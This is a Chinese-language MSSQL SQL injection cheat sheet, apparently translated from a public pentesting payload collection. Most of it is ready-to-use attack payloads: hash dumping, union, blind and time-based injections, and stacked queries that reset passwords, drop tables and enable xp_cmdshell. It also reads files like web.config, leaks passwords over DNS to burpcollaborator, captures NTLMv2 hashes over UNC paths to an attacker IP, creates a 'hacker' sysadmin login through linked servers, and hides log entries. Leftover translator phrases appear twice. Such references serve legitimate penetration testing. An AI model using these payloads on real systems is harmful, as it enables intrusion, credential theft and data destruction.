# MSSQL 注入

## 摘要

* [MSSQL 默认数据库](#mssql-default-databases)
* [MSSQL 注释](#mssql-comments)
* [MSSQL 用户](#mssql-user)
* [MSSQL 版本](#mssql-version)
* [MSSQL 主机名](#mssql-hostname)
* [MSSQL 数据库名称](#mssql-database-name)
* [MSSQL 数据库凭据](#mssql-database-credentials)
* [MSSQL 列出数据库](#mssql-list-databases)
* [MSSQL 列出列](#mssql-list-columns)
* [MSSQL 列出表](#mssql-list-tables)
* [基于联合的 MSSQL](#mssql-union-based)
* [基于错误的 MSSQL](#mssql-error-based)
* [基于盲注的 MSSQL](#mssql-blind-based)
* [基于时间的 MSSQL](#mssql-time-based)
* [MSSQL 堆叠查询](#mssql-stacked-query)
* [MSSQL 读取文件](#mssql-read-file)
* [MSSQL 命令执行](#mssql-command-execution)
* [MSSQL 带外](#mssql-out-of-band)
  * [MSSQL DNS 数据泄露](#mssql-dns-exfiltration)
  * [MSSQL UNC 路径](#mssql-unc-path)
* [使 MSSQL 用户成为 DBA](#mssql-make-user-dba-db-admin)
* [MSSQL 受信任链接](#mssql-trusted-links)
* [列出 MSSQL 权限](#mssql-list-permissions)

## MSSQL 默认数据库

| 名称               | 描述                             |
| ------------------ | -------------------------------- |
| pubs               | 在 MSSQL 2005 上不可用           |
| model              | 所有版本中可用                   |
| msdb               | 所有版本中可用                   |
| tempdb             | 所有版本中可用                   |
| northwind          | 所有版本中可用                   |
| information_schema | 从 MSSQL 2000 及更高版本开始可用 |

## MSSQL 注释

| 类型               | 描述       |
| ------------------ | ---------- |
| `/* MSSQL 注释 */` | C 风格注释 |
| `-- -`             | SQL 注释   |
| `;%00`             | 空字节     |

## MSSQL 用户

```sql
SELECT CURRENT_USER
SELECT user_name();
SELECT system_user;
SELECT user;
```

## MSSQL 版本

```sql
SELECT @@version
```

## MSSQL 主机名

```sql
SELECT HOST_NAME()
SELECT @@hostname
SELECT @@SERVERNAME
SELECT SERVERPROPERTY('productversion')
SELECT SERVERPROPERTY('productlevel')
SELECT SERVERPROPERTY('edition');
```

## MSSQL 数据库名称

```sql
SELECT DB_NAME()
```

## MSSQL 数据库凭据

* **MSSQL 2000**: Hashcat 模式 131: `0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578`

```sql
SELECT name, password FROM master..sysxlogins
SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins 
-- Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer
```

* **MSSQL 2005**: Hashcat 模式132: `0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe`

    ```sql
    SELECT name, password_hash FROM master.sys.sql_logins
    SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
    ```

根据您提供的文档，以下是翻译后的内容：

## MSSQL 列出数据库

```sql
SELECT name FROM master..sysdatabases;
SELECT DB_NAME(N); — 对于 N = 0, 1, 2, …
SELECT STRING_AGG(name, ', ') FROM master..sysdatabases; -- 更改分隔符值，例如 ', ' 为您想要的任何值 => master, tempdb, model, msdb   (仅在 MSSQL 2017+ 中有效)
```

## MSSQL 列出列

```sql
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = ‘mytable’); — 仅针对当前数据库
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — 列出 master..sometable 的列名和类型

SELECT table_catalog, column_name FROM information_schema.columns
```

## MSSQL 列出表

```sql
SELECT name FROM master..sysobjects WHERE xtype = ‘U’; — 使用 xtype = ‘V’ 查看视图
SELECT name FROM someotherdb..sysobjects WHERE xtype = ‘U’;
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — 列出 master..sometable 的列名和类型

SELECT table_catalog, table_name FROM information_schema.columns
SELECT STRING_AGG(name, ', ') FROM master..sysobjects WHERE xtype = 'U'; -- 更改分隔符值，例如 ', ' 为您想要的任何值 => trace_xe_action_map, trace_xe_event_map, spt_fallback_db, spt_fallback_dev, spt_fallback_usg, spt_monitor, MSreplication_options  (仅在 MSSQL 2017+ 中有效)
```

## 基于联合的 MSSQL

```sql
-- 提取数据库名称
$ SELECT name FROM master..sysdatabases
[*] 注入
[*] msdb
[*] tempdb

-- 从注入数据库中提取表
$ SELECT name FROM Injection..sysobjects WHERE xtype = 'U'
[*] Profiles
[*] Roles
[*] Users

-- 提取 Users 表的列
$ SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users')
[*] UserId
[*] UserName

-- 最后提取数据
$ SELECT  UserId, UserName from Users
```

## 基于错误的 MSSQL

```sql
对于整数输入 : convert(int,@@version)
对于整数输入 : cast((SELECT @@version) as int)

对于字符串输入   : ' + convert(int,@@version) + '
对于字符串输入   : ' + cast((SELECT @@version) as int) + '
```

## 基于盲注的 MSSQL

```sql
AND LEN(SELECT TOP 1 username FROM tblusers)=5 ; -- -

AND ASCII(SUBSTRING(SELECT TOP 1 username FROM tblusers),1,1)=97
AND UNICODE(SUBSTRING((SELECT 'A'),1,1))>64-- 
AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables > 'A'

AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>90

SELECT @@version WHERE @@version LIKE '%12.0.2000.8%'

WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table)
SELECT message FROM data WHERE row = 1 and message like 't%'
```

## 基于时间的 MSSQL

```sql
ProductID=1;waitfor delay '0:0:10'--
ProductID=1);waitfor delay '0:0:10'--
ProductID=1';waitfor delay '0:0:10'--
ProductID=1');waitfor delay '0:0:10'--
ProductID=1));waitfor delay '0:0:10'--

IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'
IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';
```

## MSSQL 堆叠查询

* 不使用任何语句终止符

  ```sql
  -- 多个 SELECT 语句
  SELECT 'A'SELECT 'B'SELECT 'C'
  
  -- 使用堆叠查询更新密码
  SELECT id, username, password FROM users WHERE username = 'admin'exec('update[users]set[password]=''a''')--
  
  -- 使用堆叠查询启用 xp_cmdshell
  -- 您将无法获得查询的输出，将其重定向到文件 
  SELECT id, username, password FROM users WHERE username = 'admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
  ```

* 使用分号 ";" 添加另一个查询

  ```sql
  ProductID=1; DROP members--
  ```

## MSSQL 读取文件

**权限**：`BULK` 选项需要 `ADMINISTER BULK OPERATIONS` 或 `ADMINISTER DATABASE BULK OPERATIONS` 权限。

```sql
-1 union select null,(select x from OpenRowset(BULK 'C:\Windows\win.ini',SINGLE_CLOB) R(x)),null,null
```

根据您提供的文档，以下是翻译后的内容：

## MSSQL命令执行

```sql
EXEC xp_cmdshell "net user";
EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';
EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';
```

如果您需要重新激活xp_cmdshell（在SQL Server 2005中默认禁用）

```sql
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;
```

为了与MSSQL实例交互。

```powershell
sqsh -S 192.168.1.X -U sa -P superPassword
python mssqlclient.py WORKGROUP/Administrator:password@192.168.1X -port 46758
```

执行Python脚本

> 由与使用xp_cmdshell执行命令的用户不同的用户执行

```powershell
#打印正在使用的用户（并执行命令）
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("getpass").getuser())'
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
#打开并读取文件
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open("C:\\inetpub\\wwwroot\\web.config", "r").read())'
#多行
EXECUTE sp_execute_external_script @language = N'Python', @script = N'
import sys
print(sys.version)
'
GO
```

## MSSQL带外攻击

### MSSQL DNS数据泄露

技术来自 https://twitter.com/ptswarm/status/1313476695295512578/photo/1

```powershell
# 权限：需要在服务器上具有VIEW SERVER STATE权限。
1 and exists(select * from fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.xem',null,null))

# 权限：需要具有CONTROL SERVER权限。
1 (select 1 where exists(select * from fn_get_audit_file('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\',default,default)))
1 and exists(select * from fn_trace_gettable('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.trc',default))
```

### MSSQL UNC路径

MSSQL支持堆叠查询，因此我们可以创建一个指向我们IP地址的变量，然后使用`xp_dirtree`函数列出我们SMB共享中的文件并获取NTLMv2哈希。

```sql
1'; use master; exec xp_dirtree '\\10.10.15.XX\SHARE';-- 
```

```sql
xp_dirtree '\\attackerip\file'
xp_fileexist '\\attackerip\file'
BACKUP LOG [TESTING] TO DISK = '\\attackerip\file'
BACKUP DATABASE [TESTING] TO DISK = '\\attackeri\file'
RESTORE LOG [TESTING] FROM DISK = '\\attackerip\file'
RESTORE DATABASE [TESTING] FROM DISK = '\\attackerip\file'
RESTORE HEADERONLY FROM DISK = '\\attackerip\file'
RESTORE FILELISTONLY FROM DISK = '\\attackerip\file'
RESTORE LABELONLY FROM DISK = '\\attackerip\file'
RESTORE REWINDONLY FROM DISK = '\\attackerip\file'
RESTORE VERIFYONLY FROM DISK = '\\attackerip\file'
```

## 将用户设置为DBA（数据库管理员）

```sql
EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin;
```

## MSSQL可信链接

> 数据库之间的链接甚至可以跨森林信任工作。

```powershell
msf> use exploit/windows/mssql/mssql_linkcrawler
[msf> set DEPLOY true] #如果希望滥用权限以获得meterpreter会话，请将DEPLOY设置为true
```

手动利用

```sql
-- 查找链接
select * from master..sysservers

-- 通过链接执行查询
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
select version from openquery("linkedserver", 'select @@version as version');

-- 链接多个openquery
select version from openquery("link1",'select version from openquery("link2","select @@version as version")')

-- 执行shell命令
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer
select 1 from openquery("linkedserver",'select 1;exec master..xp_cmdshell "dir c:"')

-- 创建用户并给予管理员权限
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```

## 列出权限

列出当前用户在服务器上的有效权限。

```sql
SELECT * FROM fn_my_permissions(NULL, 'SERVER'); 
```

列出当前用户在数据库上的有效权限。

```sql
SELECT * FROM fn_my_permissions (NULL, 'DATABASE');
```

列出当前用户在视图上的有效权限。

```
SELECT * FROM fn_my_permissions('Sales.vIndividualCustomer', 'OBJECT') ORDER BY subentity_name, permission_name; 
```

检查当前用户是否是指定服务器角色的成员。

```sql
-- 可能的角色：sysadmin, serveradmin, dbcreator, setupadmin, bulkadmin, securityadmin, diskadmin, public, processadmin
SELECT is_srvrolemember('sysadmin');
```

## MSSQL操作安全

在查询中使用`SP_PASSWORD`可以隐藏日志，例如：`' AND 1=1--sp_password`

```sql
-- 在此事件的文本中找到了'sp_password'。
-- 出于安全原因，文本已被此评论替换。
```

## 参考资料

* [Pentest Monkey - mssql-sql-injection-cheat-sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
* [基于错误的SQL注入](https://github.com/incredibleindishell/exploit-code-by-me/blob/master/MSSQL%20Error-Based%20SQL%20Injection%20Order%20by%20clause/Error%20based%20SQL%20Injection%20in%20“Order%20By”%20clause%20(MSSQL).pdf)
* [MSSQL可信链接 - HackTricks.xyz](https://book.hacktricks.xyz/windows/active-directory-methodology/mssql-trusted-links)
* [SQL Server – 链接...链接...链接...和Shell：如何黑客攻击SQL Server中的数据库链接！ - Antti Rantasaari - 2013年6月6日](https://blog.netspi.com/how-to-hack-database-links-in-sql-server/)
* [DAFT: 数据库审计框架和工具包 - NetSPI](https://github.com/NetSPI/DAFT)
* [SQL Server UNC路径注入备忘单 - nullbind](https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e)
* [完整的MSSQL注入PWNage - ZeQ3uL && JabAv0C - 2009年1月28日](https://www.exploit-db.com/papers/12975)
* [Microsoft - sys.fn_my_permissions (Transact-SQL)](https://docs.microsoft.com/en-us/sql/relational-databases/system-functions/sys-fn-my-permissions-transact-sql?view=sql-server-ver15)
* [Microsoft - IS_SRVROLEMEMBER (Transact-SQL)](https://docs.microsoft.com/en-us/sql/t-sql/functions/is-srvrolemember-transact-sql?view=sql-server-ver15)
* [由于非正统的MSSQL设计选择，AWS WAF客户端仍然容易受到SQL注入攻击 - Marc Olivier Bergeron - 2023年6月21日](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)